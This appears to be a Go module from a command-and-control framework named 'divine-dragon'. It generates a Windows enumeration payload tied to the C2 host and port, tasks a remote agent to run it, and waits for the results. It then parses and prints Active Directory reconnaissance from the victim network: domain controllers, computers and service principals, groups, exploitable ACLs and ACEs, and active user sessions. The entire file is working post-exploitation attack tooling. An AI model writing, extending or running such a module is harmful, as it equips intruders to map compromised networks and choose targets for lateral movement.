package local_enum

import (
	"divine-dragon/c2"
	"divine-dragon/payload_generator"
	"divine-dragon/util"
	"encoding/json"
	"fmt"
	"os"
	"strings"
	"text/tabwriter"
	"time"
)

type PowerViewEnumModule struct {
	c2m       *c2.C2Module
	agentUuid string
	logger    util.Logger
}

func NewPowerViewEnumModule(c2mOpt *c2.C2Module, agentUuidOpt string) *PowerViewEnumModule {
	pvem := PowerViewEnumModule{
		c2m:       c2mOpt,
		agentUuid: agentUuidOpt,
	}
	pvem.logger = util.PowerViewLogger(true, "")
	return &pvem
}

func (pvem *PowerViewEnumModule) Run() {
	stpgm := payload_generator.NewStageTwoPayloadGeneratorModule(pvem.c2m.GetC2Hostname(), pvem.c2m.GetC2Port(), "powerview_enum", "windows", "amd64", "powerview_enum.exe")
	stpgm.Run()

	jobUuid, err := pvem.c2m.AddJob(pvem.agentUuid, "powerview_enum.exe")
	if err != nil {
		pvem.logger.Log.Error(err)
		return
	}
	pvem.logger.Log.Info("Waiting for an agent to execute a job...")
	var jobs []string
	var statuses map[string]bool
	var results map[string]string
	jobNotFound := true
	for jobNotFound {
		jobs, statuses, results = pvem.c2m.GetAllAgentJobs(pvem.agentUuid)
		for _, job := range jobs {
			if jobUuid == job && len(results[jobUuid]) > 0 {
				jobNotFound = false
			}
		}
		// pttm.logger.Log.Info("Sleeping for 3 sec...")
		time.Sleep(time.Second * 1)
	}
	if !statuses[jobUuid] {
		pvem.logger.Log.Info("Job wasn't executed as planned. Stopping...")
		return
	} else {
		pvem.logger.Log.Noticef("Job executed fine. Parsing the results...")
		if strings.Compare(results[jobUuid], "Job hasn't returned some output. But it seems ok.") == 0 {
			pvem.logger.Log.Info("Job executed fine, but it has no results. Stopping...")
			return
		} else {
			if strings.Contains(results[jobUuid], "Found users") {
				pvem.logger.Log.Info("Module found some users...")
			}
			if strings.Contains(results[jobUuid], "Found computers") {
				pvem.logger.Log.Info("Module found some computers...")
			}
			if strings.Contains(results[jobUuid], "Found DCs") {
				pvem.logger.Log.Info("Module found some DCs...")
			}
			if strings.Contains(results[jobUuid], "Found domain") {
				pvem.logger.Log.Info("Module found a domain...")
			}
			if strings.Contains(results[jobUuid], "Found groups") {
				pvem.logger.Log.Info("Module found some groups...")
			}
			if strings.Contains(results[jobUuid], "Found domain SID") {
				pvem.logger.Log.Info("Module found a domain SID...")
			}
			if strings.Contains(results[jobUuid], "Found OUs") {
				pvem.logger.Log.Info("Module found some OUs...")
			}
			if strings.Contains(results[jobUuid], "Found sessions on") {
				pvem.logger.Log.Info("Module found some active sessions...")
			}
			if strings.Contains(results[jobUuid], "Found logged on users") {
				pvem.logger.Log.Info("Module found some logged on users...")
			}
			if strings.Contains(results[jobUuid], "Found some interesting ACL") {
				pvem.logger.Log.Info("Module found some interesting ACL...")
			}
			if strings.Contains(results[jobUuid], "Found some interesting ACE") {
				pvem.logger.Log.Info("Module found some interesting ACE...")
			}
			startOfJsonInd := strings.Index(results[jobUuid], "Result in JSON:")
			jsonOutput := results[jobUuid][startOfJsonInd+len("Result in JSON:")+2:]
			var output payloadOutput
			err := json.Unmarshal([]byte(jsonOutput), &output)
			if err != nil {
				pvem.logger.Log.Error("Something wrong with the payload output. Exiting...")
				return
			}
			pvem.printResults(output)
		}
	}
}

type payloadOutput struct {
	RemoteLoggedOn []struct {
		UserName     string `json:"UserName"`
		LogonDomain  string `json:"LogonDomain"`
		AuthDomains  string `json:"AuthDomains"`
		LogonServer  string `json:"LogonServer"`
		ComputerName string `json:"ComputerName"`
	} `json:"RemoteLoggedOn"`
	ACEs []struct {
		AceQualifier           int    `json:"AceQualifier"`
		ObjectDN               string `json:"ObjectDN"`
		ActiveDirectoryRights  int    `json:"ActiveDirectoryRights"`
		ObjectAceType          string `json:"ObjectAceType"`
		ObjectSID              string `json:"ObjectSID"`
		InheritanceFlags       int    `json:"InheritanceFlags"`
		BinaryLength           int    `json:"BinaryLength"`
		AceType                int    `json:"AceType"`
		ObjectAceFlags         int    `json:"ObjectAceFlags"`
		IsCallback             bool   `json:"IsCallback"`
		PropagationFlags       int    `json:"PropagationFlags"`
		SecurityIdentifier     string `json:"SecurityIdentifier"`
		AccessMask             int    `json:"AccessMask"`
		AuditFlags             int    `json:"AuditFlags"`
		IsInherited            bool   `json:"IsInherited"`
		AceFlags               int    `json:"AceFlags"`
		InheritedObjectAceType string `json:"InheritedObjectAceType"`
		OpaqueLength           int    `json:"OpaqueLength"`
	} `json:"ACEs"`
	RemoteSessions []struct {
		CName        string `json:"CName"`
		UserName     string `json:"UserName"`
		Time         int    `json:"Time"`
		IdleTime     int    `json:"IdleTime"`
		ComputerName string `json:"ComputerName"`
	} `json:"RemoteSessions"`
	Groups []struct {
		Grouptype              int64  `json:"grouptype"`
		Admincount             int    `json:"admincount,omitempty"`
		Iscriticalsystemobject bool   `json:"iscriticalsystemobject,omitempty"`
		Samaccounttype         int    `json:"samaccounttype"`
		Samaccountname         string `json:"samaccountname"`
		Whenchanged            string `json:"whenchanged"`
		Objectsid              string `json:"objectsid"`
		Objectclass            string `json:"objectclass"`
		Cn                     string `json:"cn"`
		Usnchanged             int    `json:"usnchanged"`
		Systemflags            int    `json:"systemflags,omitempty"`
		Name                   string `json:"name"`
		Dscorepropagationdata  string `json:"dscorepropagationdata"`
		Description            string `json:"description"`
		Distinguishedname      string `json:"distinguishedname"`
		Member                 string `json:"member,omitempty"`
		Usncreated             int    `json:"usncreated"`
		Whencreated            string `json:"whencreated"`
		Instancetype           int    `json:"instancetype"`
		Objectguid             string `json:"objectguid"`
		Objectcategory         string `json:"objectcategory"`
		Memberof               string `json:"memberof,omitempty"`
	} `json:"Groups"`
	DomainSID string `json:"Domain-SID"`
	Domain    struct {
		Forest struct {
			Name                  string `json:"Name"`
			Sites                 string `json:"Sites"`
			Domains               string `json:"Domains"`
			GlobalCatalogs        string `json:"GlobalCatalogs"`
			ApplicationPartitions string `json:"ApplicationPartitions"`
			ForestModeLevel       int    `json:"ForestModeLevel"`
			ForestMode            int    `json:"ForestMode"`
			RootDomain            string `json:"RootDomain"`
			Schema                string `json:"Schema"`
			SchemaRoleOwner       string `json:"SchemaRoleOwner"`
			NamingRoleOwner       string `json:"NamingRoleOwner"`
		} `json:"Forest"`
	} `json:"Domain"`
	LocalSessions []struct {
		CName        string `json:"CName"`
		UserName     string `json:"UserName"`
		Time         int    `json:"Time"`
		IdleTime     int    `json:"IdleTime"`
		ComputerName string `json:"ComputerName"`
	} `json:"LocalSessions"`
	Computers []struct {
		Pwdlastset                   string `json:"pwdlastset"`
		Logoncount                   int    `json:"logoncount"`
		Serverreferencebl            string `json:"serverreferencebl,omitempty"`
		Badpasswordtime              string `json:"badpasswordtime"`
		Distinguishedname            string `json:"distinguishedname"`
		Objectclass                  string `json:"objectclass"`
		Lastlogontimestamp           string `json:"lastlogontimestamp"`
		Name                         string `json:"name"`
		Objectsid                    string `json:"objectsid"`
		Samaccountname               string `json:"samaccountname"`
		Localpolicyflags             int    `json:"localpolicyflags"`
		Codepage                     int    `json:"codepage"`
		Samaccounttype               int    `json:"samaccounttype"`
		Whenchanged                  string `json:"whenchanged"`
		Accountexpires               string `json:"accountexpires"`
		Countrycode                  int    `json:"countrycode"`
		Operatingsystem              string `json:"operatingsystem"`
		Instancetype                 int    `json:"instancetype"`
		MsdfsrComputerreferencebl    string `json:"msdfsr-computerreferencebl,omitempty"`
		Objectguid                   string `json:"objectguid"`
		Operatingsystemversion       string `json:"operatingsystemversion"`
		Lastlogoff                   string `json:"lastlogoff"`
		Objectcategory               string `json:"objectcategory"`
		Dscorepropagationdata        string `json:"dscorepropagationdata"`
		Serviceprincipalname         string `json:"serviceprincipalname"`
		Usncreated                   int    `json:"usncreated"`
		Lastlogon                    string `json:"lastlogon"`
		Badpwdcount                  int    `json:"badpwdcount"`
		Cn                           string `json:"cn"`
		Useraccountcontrol           int    `json:"useraccountcontrol"`
		Whencreated                  string `json:"whencreated"`
		Primarygroupid               int    `json:"primarygroupid"`
		Iscriticalsystemobject       bool   `json:"iscriticalsystemobject"`
		MsdsSupportedencryptiontypes int    `json:"msds-supportedencryptiontypes"`
		Usnchanged                   int    `json:"usnchanged"`
		Ridsetreferences             string `json:"ridsetreferences,omitempty"`
		Dnshostname                  string `json:"dnshostname"`
	} `json:"Computers"`
	OUs []struct {
		Usncreated             int    `json:"usncreated"`
		Systemflags            int    `json:"systemflags"`
		Iscriticalsystemobject bool   `json:"iscriticalsystemobject"`
		Gplink                 string `json:"gplink"`
		Whenchanged            string `json:"whenchanged"`
		Objectclass            string `json:"objectclass"`
		Showinadvancedviewonly bool   `json:"showinadvancedviewonly"`
		Usnchanged             int    `json:"usnchanged"`
		Dscorepropagationdata  string `json:"dscorepropagationdata"`
		Name                   string `json:"name"`
		Description            string `json:"description"`
		Distinguishedname      string `json:"distinguishedname"`
		Ou                     string `json:"ou"`
		Whencreated            string `json:"whencreated"`
		Instancetype           int    `json:"instancetype"`
		Objectguid             string `json:"objectguid"`
		Objectcategory         string `json:"objectcategory"`
	} `json:"OUs"`
	LocalLoggedOn []struct {
		UserName     string `json:"UserName"`
		LogonDomain  string `json:"LogonDomain"`
		AuthDomains  string `json:"AuthDomains"`
		LogonServer  string `json:"LogonServer"`
		ComputerName string `json:"ComputerName"`
	} `json:"LocalLoggedOn"`
	DCs []struct {
		Name string `json:"Name"`
	} `json:"DCs"`
	ACLs []struct {
		AceType               int    `json:"AceType"`
		ObjectDN              string `json:"ObjectDN"`
		ActiveDirectoryRights int    `json:"ActiveDirectoryRights"`
		OpaqueLength          int    `json:"OpaqueLength"`
		ObjectSID             string `json:"ObjectSID"`
		InheritanceFlags      int    `json:"InheritanceFlags"`
		BinaryLength          int    `json:"BinaryLength"`
		IsInherited           bool   `json:"IsInherited"`
		IsCallback            bool   `json:"IsCallback"`
		PropagationFlags      int    `json:"PropagationFlags"`
		SecurityIdentifier    string `json:"SecurityIdentifier"`
		AccessMask            int    `json:"AccessMask"`
		AuditFlags            int    `json:"AuditFlags"`
		AceFlags              int    `json:"AceFlags"`
		AceQualifier          int    `json:"AceQualifier"`
	} `json:"ACLs"`
}

func (pvem *PowerViewEnumModule) printResults(output payloadOutput) {
	w := tabwriter.NewWriter(os.Stdout, 1, 1, 1, ' ', 0)
	pvem.logger.Log.Info("Current domain:")
	fmt.Println()
	fmt.Fprintf(w, "\tForestName\t%s\n", output.Domain.Forest.Name)
	fmt.Fprintf(w, "\tGlobalCatalogs\t%s\n\n", output.Domain.Forest.GlobalCatalogs)
	pvem.logger.Log.Info("Domain SID:")
	fmt.Println()
	fmt.Fprintf(w, "\tSID\t%s\n\n", output.DomainSID)
	pvem.logger.Log.Info("Domain Controllers:")
	fmt.Println()
	for _, DC := range output.DCs {
		fmt.Fprintf(w, "\tName\t%s\n\n", DC.Name)
	}
	fmt.Println()
	pvem.logger.Log.Info("Computers:")
	fmt.Println()
	for _, computer := range output.Computers {
		fmt.Fprintf(w, "\tName\t%s\n", computer.Name)
		fmt.Fprintf(w, "\tOS\t%s %s\n", computer.Operatingsystem, computer.Operatingsystemversion)
		fmt.Fprintf(w, "\tServices\t%s\n", computer.Serviceprincipalname)
		fmt.Fprintf(w, "\tDNS\t%s\n\n", computer.Dnshostname)
		fmt.Fprintf(w, "\t---\n\n")
	}
	pvem.logger.Log.Info("OUs:")
	fmt.Println()
	for _, OU := range output.OUs {
		fmt.Fprintf(w, "\tName\t%s\n\n", OU.Name)
		fmt.Fprintf(w, "\t---\n\n")
	}
	fmt.Println()
	pvem.logger.Log.Info("Groups:")
	fmt.Println()
	for _, group := range output.Groups {
		fmt.Fprintf(w, "\tName\t%s\n", group.Cn)
		fmt.Fprintf(w, "\tMembers\t%s\n\n", group.Member)
		fmt.Fprintf(w, "\t---\n\n")
	}
	pvem.logger.Log.Info("ACLs:")
	fmt.Println()
	for _, ACL := range output.ACLs {
		fmt.Fprintf(w, "\tObject\t%s\n", ACL.ObjectDN)
		fmt.Fprintf(w, "\tRight\t%v\n\n", ACL.ActiveDirectoryRights)
		fmt.Fprintf(w, "\t---\n\n")
	}
	pvem.logger.Log.Info("ACEs:")
	fmt.Println()
	for _, ACE := range output.ACEs {
		fmt.Fprintf(w, "\tObject\t%s\n", ACE.ObjectDN)
		fmt.Fprintf(w, "\tExtendedRight\t%s\n", ACE.ObjectAceType)
		fmt.Fprintf(w, "\tInheritence\t%s\n\n", ACE.InheritedObjectAceType)
		fmt.Fprintf(w, "\t---\n\n")
	}
	pvem.logger.Log.Info("Active local sessions:")
	fmt.Println()
	for _, localSession := range output.LocalSessions {
		fmt.Fprintf(w, "\tComputer\t%s\n", localSession.ComputerName)
		fmt.Fprintf(w, "\tAddr\t%s\n", localSession.CName)
		fmt.Fprintf(w, "\tUser\t%s\n\n", localSession.UserName)
		fmt.Fprintf(w, "\t---\n\n")
	}
	pvem.logger.Log.Info("Active remote sessions:")
	fmt.Println()
	for _, remoteSession := range output.RemoteSessions {
		fmt.Fprintf(w, "\tComputer\t%s\n", remoteSession.ComputerName)
		fmt.Fprintf(w, "\tAddr\t%s\n", remoteSession.CName)
		fmt.Fprintf(w, "\tUser\t%s\n\n", remoteSession.UserName)
		fmt.Fprintf(w, "\t---\n\n")
	}
	pvem.logger.Log.Info("Active local logged on users:")
	fmt.Println()
	for _, localLoggedOn := range output.LocalLoggedOn {
		fmt.Fprintf(w, "\tComputer\t%s\n", localLoggedOn.ComputerName)
		fmt.Fprintf(w, "\tLogonDomain\t%s\n", localLoggedOn.LogonDomain)
		fmt.Fprintf(w, "\tLogonServer\t%s\n", localLoggedOn.LogonServer)
		fmt.Fprintf(w, "\tUser\t%s\n\n", localLoggedOn.UserName)
		fmt.Fprintf(w, "\t---\n\n")
	}
	pvem.logger.Log.Info("Active remote logged on users:")
	fmt.Println()
	for _, remoteLoggedOn := range output.RemoteLoggedOn {
		fmt.Fprintf(w, "\tComputer\t%s\n", remoteLoggedOn.ComputerName)
		fmt.Fprintf(w, "\tLogonDomain\t%s\n", remoteLoggedOn.LogonDomain)
		fmt.Fprintf(w, "\tLogonServer\t%s\n", remoteLoggedOn.LogonServer)
		fmt.Fprintf(w, "\tUser\t%s\n\n", remoteLoggedOn.UserName)
		fmt.Fprintf(w, "\t---\n\n")
	}
	w.Flush()
}
